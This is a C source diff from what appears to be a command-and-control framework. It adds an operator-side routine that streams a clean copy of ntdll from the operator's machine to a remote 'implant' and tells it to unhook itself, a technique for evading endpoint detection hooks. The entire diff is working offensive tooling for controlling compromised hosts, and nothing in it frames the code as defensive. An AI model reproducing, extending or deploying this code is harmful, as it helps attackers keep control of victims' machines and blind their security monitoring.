@@ -490,3 +490,142 @@ DWORD WINAPI thread_unhookl(struct unhookl_params_t* params) {
 	free(params);
 	return 0;
 }
+
+int _est_unhook_byon_thread(endpoint_id_t endpoint_id,
+	int64_t file_len,
+	tremont_stream_id* stream_id_ptr,
+	struct bleeddial_ctx_t* ctx) {
+
+	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
+
+	tremont_stream_id unhook_byon_stream;
+
+	_req_new_thread(endpoint_id,
+		stream_id_ptr,
+		ctx
+	);
+	unhook_byon_stream = *stream_id_ptr;
+
+	struct wrkr_msg_t req;
+	memset(&req, 0, sizeof(req));
+	req.msg_enum = UNHOOK_BYON;
+
+	struct unhookbyon_msg_t* unhook_byon_msg;
+	unhook_byon_msg = &req.unhookbyon;
+	unhook_byon_msg->msg_enum = REQ;
+
+	struct unhookbyon_req_t* unhook_byon_req;
+	unhook_byon_req = &unhook_byon_msg->req;
+
+	unhook_byon_req->file_len = file_len;
+
+	tremont_send(unhook_byon_stream, (byte*)&req, sizeof(req), nexus);
+
+	struct wrkr_msg_t res;
+	tremont_recv(unhook_byon_stream, (byte*)&res, sizeof(res), nexus);
+
+	return res.unhookbyon.res.allowed == 1 ? 0 : -1;
+}
+
+DWORD WINAPI thread_unhookbyon(struct unhookbyon_params_t* params) {
+	char alias_buf[255] = { 0 };
+	int res = -1;
+
+	EnterCriticalSection(&params->ctx->endpoint_db_cs);
+	res = endpoint_id_alias(alias_buf,
+		sizeof(alias_buf),
+		params->endpoint_id,
+		params->ctx->endpoint_db
+	);
+	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
+	if (res == -1)
+		printf("Uploading ntdll to implant %d...\n",
+			params->endpoint_id);
+	else
+		printf("Uploading ntdll to %s (%d)...\n",
+			alias_buf,
+			params->endpoint_id);
+
+	HANDLE file_handle;
+	file_handle = CreateFileA(params->local_path,
+		GENERIC_READ,
+		FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+	if (file_handle == INVALID_HANDLE_VALUE) {
+		printf("Can't access file on local machine\n");
+		return -1;
+	}
+
+	int64_t file_len;
+	GetFileSizeEx(file_handle, (PLARGE_INTEGER)&file_len);
+
+	tremont_stream_id unhook_byon_stream;
+	res = _est_unhook_byon_thread(params->endpoint_id,
+		file_len,
+		&unhook_byon_stream,
+		params->ctx
+	);
+	if (res == -1) {
+		printf("Couldn't allocate enough memory on implant\n");
+		return -1;
+	}
+
+	BOOL can_read = FALSE;
+	int64_t total_sent = 0;
+	int read_from_file = 0;
+	char temp_buf[255];
+
+	while (total_sent < file_len) {
+		ReadFile(file_handle,
+			temp_buf,
+			sizeof(temp_buf),
+			&read_from_file,
+			NULL
+		);
+		tremont_send(
+			unhook_byon_stream,
+			temp_buf,
+			read_from_file,
+			params->ctx->transport_pcb->nexus
+		);
+		total_sent += read_from_file;
+	}
+	printf("Upload complete!\n");
+
+	struct wrkr_msg_t msg;
+	tremont_recv(unhook_byon_stream, (byte*)&msg,
+		sizeof(msg), params->ctx->transport_pcb->nexus);
+
+	if (alias_buf[0] == 0)
+		printf("Implant %d starting to unhook...\n",
+			params->endpoint_id);
+	else
+		printf("%s (%d) starting to unhook...\n",
+			alias_buf,
+			params->endpoint_id);
+
+	tremont_recv(unhook_byon_stream, (byte*)&msg,
+		sizeof(msg), params->ctx->transport_pcb->nexus);
+	
+	memset(&msg, 0, sizeof(msg));
+	msg.msg_enum = UNHOOK_BYON;
+	msg.unhookbyon.fak.sanity = 1;
+	tremont_send(unhook_byon_stream, (byte*)&msg,
+		sizeof(msg), params->ctx->transport_pcb->nexus);
+
+	if (alias_buf[0] == 0)
+		printf("Implant %d unhooked!\n",
+			params->endpoint_id);
+	else
+		printf("%s (%d) unhooked!\n",
+			alias_buf,
+			params->endpoint_id);
+
+	CloseHandle(file_handle);
+	free(params);
+	return 0;
+}
